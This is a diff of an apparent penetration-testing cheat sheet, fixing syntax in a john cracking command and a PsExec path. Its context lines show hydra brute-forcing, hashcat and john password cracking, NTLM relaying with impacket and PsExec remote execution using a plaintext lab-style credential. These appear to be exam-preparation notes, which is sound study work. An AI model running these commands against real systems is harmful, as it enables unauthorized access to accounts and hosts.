@@ -381,7 +381,7 @@ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form 
 hashcat -m 0 -a 0 crackme.txt /usr/share/wordlists/rockyou.txt -r /usr/share/john/rules/best64.rule --force
 
 # john
-john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/john/rules/best64.rule hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules /usr/share/john/rules/best64.rule hash.txt
 ```
 ## Windows
 ### crackmap
@@ -449,7 +449,7 @@ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c
 ```
 ## PsExec
 ```bash
-./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
+.\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
 
 # OTH
 net use \\files04
